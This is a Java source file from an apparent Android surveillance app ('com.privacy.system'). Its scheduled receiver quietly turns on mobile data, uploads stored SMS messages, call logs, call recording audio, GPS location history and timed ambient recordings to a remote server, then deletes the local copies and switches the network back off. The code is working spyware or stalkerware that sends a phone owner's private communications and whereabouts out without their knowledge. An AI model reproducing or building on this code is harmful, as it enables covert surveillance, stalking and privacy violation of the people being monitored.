package com.privacy.system.receiver;

import java.io.File;
import java.util.ArrayList;
import com.google.gson.Gson;
import com.privacy.system.base.C;
import com.privacy.system.db.CallRecordDB;
import com.privacy.system.db.FileDB;
import com.privacy.system.db.LocManDB;
import com.privacy.system.db.MonitorDB;
import com.privacy.system.db.SMSRecordDB;
import com.privacy.system.domain.CallRecord;
import com.privacy.system.domain.LocationMessage;
import com.privacy.system.domain.Monitor;
import com.privacy.system.domain.SMSRecord;
import com.privacy.system.domain.SoundFileInfo;
import com.privacy.system.service.utilservice.ClientSocket;
import com.privacy.system.util.AppUtil;
import com.privacy.system.util.HttpUtil;
import com.privacy.system.util.Logger;
import com.privacy.system.util.NetworkUtil;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

/**
 * 自定义广播
 */
public class CronBroadcaseRectiver extends BroadcastReceiver {

	private MonitorDB monitorDB;
	private SMSRecordDB smsRecordDB;
	private LocManDB locManDB;
	private FileDB fileDB;
	private CallRecordDB callRecordDB;
	private TelephonyManager tm;
	private String myPhone;
	private String deviceId;
	private boolean isCloseMobileNet ;
	private Context context;
	private SharedPreferences sp ;
	
	@Override
	public void onReceive(final Context context, Intent intent) {
		this.context = context;
		sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
		deviceId = sp.getString(C.DEVICE_ID,"");
		if(TextUtils.isEmpty(myPhone)){
			myPhone = sp.getString(C.PHONE_NUM,"");
		}
		
		locManDB = LocManDB.getInstance(context);
		fileDB = FileDB.getInstance(context);
		smsRecordDB = SMSRecordDB.getInstance(context);
		callRecordDB = CallRecordDB.getInstance(context);
		monitorDB = MonitorDB.getInstance(context);
		
		if(!HttpUtil.detect(context)){
			Logger.d("CronBroadcaseRectiver","开启网络");
			AppUtil.toggleMobileNet(context, true);
			isCloseMobileNet = true;
		}
		
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				
				if(tm==null){
					tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
				}
				SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
				String simID = tm.getSimSerialNumber();
				
				//更改号码了 
				if(!sp.getString(C.SIM_ID,"").equals(simID)){
					Editor editor = sp.edit();
					editor.putString(C.PHONE_NUM,simID);
					editor.commit();
				}
				
				Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE + " = ?",new String []{myPhone});
				if(monitor !=null){
					String callStatus = monitor.getCallMonitorStatus();
					String smsStatus = monitor.getSmsMonitorStatus();
					if("1".equals(callStatus)){
						uploadCallRecord(callRecordDB,context);
					}
					
					if("1".equals(smsStatus)){
						 uploadSMSData(smsRecordDB,context);
					}
					uploadLocList();
					uploadRecList();
				}
				
				
				
			
			    if(isCloseMobileNet){
			    	AppUtil.toggleMobileNet(context, false);
			    }
				
			}
		}).start();
		
	}
	
	private void uploadSMSData(SMSRecordDB smsRecordDB ,Context context) {
		ArrayList<SMSRecord> list = smsRecordDB.query(SMSRecord.COL_UPLOAD_STATUS +" = ? ",new String []{"0"});
		if (list != null && list.size() > 0) {
			ArrayList<ArrayList<String>> msgList = new ArrayList<ArrayList<String>>();
			for (SMSRecord smsRecord : list) {
				// uploadSmsInfo(smsRecord);
				ArrayList<String> msgs = new ArrayList<String>();
				msgs.add(smsRecord.getType());
				msgs.add(smsRecord.getPhone());
				msgs.add(smsRecord.getName());
				msgs.add(smsRecord.getDateSent());
				msgs.add(smsRecord.getMessageContent());
				msgList.add(msgs);
			}
			String params = "key=" + ClientSocket.APP_REQ_KEY+ "&device_id=" + sp.getString(C.DEVICE_ID, "")+ "&msg_list=" + new Gson().toJson(msgList);
			Logger.d("SMSMon","正在上传短信记录");
			String uploadResult = NetworkUtil.uploadSMS(context, params,C.RequestMethod.uploadSMS);
			if (uploadResult != null && !uploadResult.startsWith("FAIL")) {
				Logger.d("SMSMon","上传短信记录成功");
				smsRecordDB.deleteAll();
			}
		}
	}
	
	private void uploadCallRecord(CallRecordDB callRecordDB,Context context){
		ArrayList<CallRecord> callRecords = callRecordDB.queryAll();
		if(callRecords !=null){
		   for (CallRecord callRecord : callRecords) {
			   ArrayList<ArrayList<String>> lists = new ArrayList<ArrayList<String>>();
			String result = callRecord.getUploadResult();
			if(!"0".equals(result)){
				ArrayList<String> callRec = new ArrayList<String>();
				callRec.add(callRecord.getCallStatus());
				callRec.add(callRecord.getPhoneNumber());
				callRec.add(callRecord.getCallName());
				callRec.add(callRecord.getCallStartTime());
				callRec.add(callRecord.getCallStopTime());
				callRec.add(callRecord.getFileName());
				lists.add(callRec);
				String params = "key=" + ClientSocket.APP_REQ_KEY + "&device_id=" + sp.getString(C.DEVICE_ID,"") + "&call_list=" + new Gson().toJson(lists);
				String uploadResult = NetworkUtil.uploadCall(context,params,C.RequestMethod.uploadCallRecord);
			    if(uploadResult !=null && !uploadResult.startsWith("FAIL")){
			    	String filePath = callRecord.getSoundRecordPath();
			    	if(!TextUtils.isEmpty(filePath)){
			    		String uploadFileResult = NetworkUtil.uploadFile(context,filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
			    		if(uploadFileResult.contains("FAULT")){
			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
			    		}else {
							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
							File file = new File(filePath);
							if(file.exists()){
								if(file.isFile()){
									file.delete();
								}
							}
						}
			    	}else {
			    		callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
					}
			    }
			 }else{
				 String filePath = callRecord.getSoundRecordPath();
				 if(!TextUtils.isEmpty(filePath)){
			    		String uploadFileResult = NetworkUtil.uploadFile(context,filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
			    		if(uploadFileResult.contains("FAIL")){
			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
			    		}else {
							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
							File file = new File(filePath);
							if(file.exists()){
								if(file.isFile()){
									file.delete();
								}
							}
						}
			    	}else {
			    		callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
				}
			 }
		  }
	   }
	}
	
	//上传定时定位信息
	private void uploadLocList(){
		ArrayList<LocationMessage> arrayList = locManDB.queryAll();
		if(arrayList !=null){
			int size = arrayList.size();
			for(int i = 0 ; i < size ; i++){
				LocationMessage lm = arrayList.get(i);
				String longitude = lm.getLongitude();
				String latitude = lm.getLatitude();
				long strTime = Long.valueOf(lm.getLocTime());
				String result = NetworkUtil.sendLocInfo(context,ClientSocket.APP_REQ_KEY,sp.getString(C.DEVICE_ID, ""),longitude, latitude, " ", strTime + "",C.RequestMethod.uploadLocation);
			    if(!TextUtils.isEmpty(result) && !result.startsWith("FAIL")){
			    	locManDB.delete(LocationMessage.COL_ID +" =? ", new String []{lm.getId()} );
			    }
			}
		}
	}
	
	//上传定时录音信息
	private void uploadRecList(){
		
		ArrayList<SoundFileInfo> sfi = fileDB.queryAll();
		if(sfi !=null){
			int size = sfi.size();
			for(int i = 0 ; i < size ; i++){
				SoundFileInfo fileInfo = sfi.get(i);
				ArrayList<ArrayList<String>> list = new ArrayList<ArrayList<String>>();
				ArrayList<String> one = new ArrayList<String>();
				one.add(fileInfo.getStartTime());
				one.add(fileInfo.getEndTime());
				String id = fileInfo.getId();
				String fileName = fileInfo.getFileName();
				one.add(fileInfo.getFileName());
				String filePath = fileInfo.getFilePath();
				list.add(one);
				String param = "key=" + ClientSocket.APP_REQ_KEY + "&device_id=" + deviceId + "&rec_list=" + new Gson().toJson(list);
				String uploadResult = NetworkUtil.uploadFileInfo(context, param, C.RequestMethod.uploadCallSoundIntrod);
				if(!TextUtils.isEmpty(uploadResult)&& !uploadResult.startsWith("FAIL")){
					Logger.d("Cron","上传定时录音文件信息成功");
					String uploadFileResult = NetworkUtil.uploadFile(context, filePath, fileName, C.RequestMethod.uploadCallSoundFile);
					if(!TextUtils.isEmpty(uploadResult) && !uploadFileResult.startsWith("FAIL")){
						Logger.d("Cron","上传定时录音文件成功");
						fileDB.delete(LocationMessage.COL_ID+" =? ",new String []{id});
						File file =new File(filePath);
						file.delete();
					}
				}
			}
		}
	}

}
